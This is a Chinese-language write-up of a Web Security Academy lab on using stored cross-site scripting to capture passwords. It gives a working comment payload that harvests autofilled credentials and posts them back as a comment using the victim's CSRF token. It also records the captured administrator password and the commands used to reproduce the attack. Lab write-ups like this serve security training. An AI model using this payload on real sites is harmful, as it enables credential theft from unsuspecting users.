---
title: "lab-capturing-passwords"
links:
  - target: xss-context-family
    relation: evidences
---

# lab-capturing-passwords

> evidences: [[xss-context-family]]

- 题面:Exploiting cross-site scripting to capture passwords(/web-security/cross-site-scripting/exploiting/lab-capturing-passwords)
- 实例:https://0a4800b80339769a89686bc300850023.web-security-academy.net(post?postId=1 存储型评论)
- 判定目标:拿走 victim(administrator)自动填充的 user/password 并登录;状态:**solved**(solved_check true)

## 关键步

1. 该 lab **没有 exploit server**(实例头部无 exploit-link),且平台防火墙挡 lab→任意外部系统
   → 放弃 Collaborator/自建 OOB,**改用同源回传**:payload 把捕获值 POST 成一条评论,自己再读回。
2. 注入评论(正文 HTML 允许):
   `<input name=username id=username><input type=password name=password onchange="if(this.value.length)fetch('/post/comment',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'csrf='+document.getElementsByName('csrf')[0].value+'&postId=1&comment='+encodeURIComponent(document.getElementById('username').value+' : '+this.value)+'&name=pwcapture&email=pw@x.com'})">`
   (victim 的密码管理器填充输入框 → `change` 触发 → 用 victim 自己的 csrf 发评论)
3. 重新拉 `/post?postId=1` 读评论即得 `administrator : 1n3kubh41g6szd5t8s49`;登录 administrator → solved。

## 证据摘录

```
lab_http get "<inst>/post?postId=1" --jar /tmp/b23-jar5.json
 -> <section class="comment"> … pwcapture … <p>administrator : 1n3kubh41g6szd5t8s49</p>
lab_http post "<inst>/login" --form csrf=<csrf> --form username=administrator --form password=1n3kubh41g6szd5t8s49 --follow
 -> 302 /my-account?id=administrator
solved_check "<inst>/" --jar /tmp/b23-jar5.json -> {"solved":true}
```

## 复现命令

```
lab_launch launch 08D9E37603CFE2EF7CF8A21C19E9FC73E81BB5D992FE2E876F8B6891B1759D43 --widget-source /web-security/cross-site-scripting/exploiting --jar /tmp/b23-jar5.json
lab_http post "<inst>/post/comment" --jar /tmp/b23-jar5.json --form csrf=<csrf> --form postId=1 --form '<上面的注入>' --form name=pwcapture --form email=pw@x.com
# victim 看过评论后:
lab_http get "<inst>/post?postId=1" --jar /tmp/b23-jar5.json   # 读回凭据
```
